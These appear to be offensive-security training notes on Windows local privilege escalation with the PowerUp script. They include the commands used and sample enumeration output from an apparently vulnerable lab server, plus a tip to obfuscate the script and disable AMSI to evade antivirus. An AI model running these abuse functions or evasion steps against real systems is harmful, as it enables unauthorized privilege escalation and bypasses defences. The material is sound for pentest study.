=============================================================================================
Windows local privilege escalation attack using PowerUP
=============================================================================================

The Powershell script 'PowerUp.ps1' aims to be a clearing-house of common Windows privilege escalation vectors that rely on misconfiguration.
It can be used to both detect and exploit common privilege escalation flaws.
Examples:
  + Token/Privilege Enumeration/Abuse
	+ Service Enumeration and abuse
	+ DLL Hijacking
	+ Registry Checks
	+ Miscellaneous Checks
  + ...
  
PowerUp is not supported anymore. 

Links with the last commit date: 
- 2017 > https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- 2015 > https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
- 2014 > https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1


Important note: Before running the PowerUP script it is important to obfuscate it a little and to disable the AMSI to avoid AV.

=============================================================================================
Example 1 - Output of the PowerUP script on a vulnerable Windows server 2012 R2 
=============================================================================================

Notes: 
- Script run as using a low-privileged user
- PowerUP version used: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1

PS C:\> powershell -ep bypass
PS C:\> import-module .\PowerUp.ps1
PS C:\> invoke-allchecks

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...

ServiceName    : unquosvc
Path           : C:\Program Files\TH Application Service\Common Files\thservice.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquosvc' -Path <HijackPath>
CanRestart     : True

ServiceName    : unquosvc
Path           : C:\Program Files\TH Application Service\Common Files\thservice.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquosvc' -Path <HijackPath>
CanRestart     : True


[*] Checking service executable and argument permissions...  

ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Application Service\fileservice.exe"
ModifiableFile                  : C:\Program Files\File Application Service\fileservice.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : WIN-EVAGJ1T16QD\user
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True


[*] Checking service permissions... 

ServiceName   : daclasvc
Path          : "C:\Program Files\Clapplication\clservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclasvc'
CanRestart    : True


[*] Checking %PATH% for potentially hijackable DLL locations...

ModifiablePath    : C:\Temp
IdentityReference : BUILTIN\Users
Permissions       : AppendData/AddSubdirectory
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'

ModifiablePath    : C:\Temp
IdentityReference : BUILTIN\Users
Permissions       : WriteData/AddFile
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'

ModifiablePath    : C:\Temp
IdentityReference : BUILTIN\Users
Permissions       : AppendData/AddSubdirectory
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'

ModifiablePath    : C:\Temp
IdentityReference : BUILTIN\Users
Permissions       : WriteData/AddFile
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'


[*] Checking for AlwaysInstallElevated registry key... (privesc8)

AbuseFunction : Write-UserAddMSI


[*] Checking for Autologon credentials in registry...

DefaultDomainName    : 
DefaultUserName      : user
DefaultPassword      : password321!
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 


[*] Checking for modifidable registry autoruns and configs... 

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\AutoProgram\program.exe"
ModifiableFile : @{ModifiablePath=C:\Program Files\AutoProgram\program.exe; IdentityReference=Everyone; 
                 Permissions=System.Object[]}

[*] Checking for modifiable schtask files/configs...

[*] Checking for unattended install files...
UnattendPath : C:\Windows\Panther\Unattend.xml


[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
[*] Checking for plaintext passwords in McAfee SiteList.xml files....
[*] Checking for cached Group Policy Preferences .xml files....

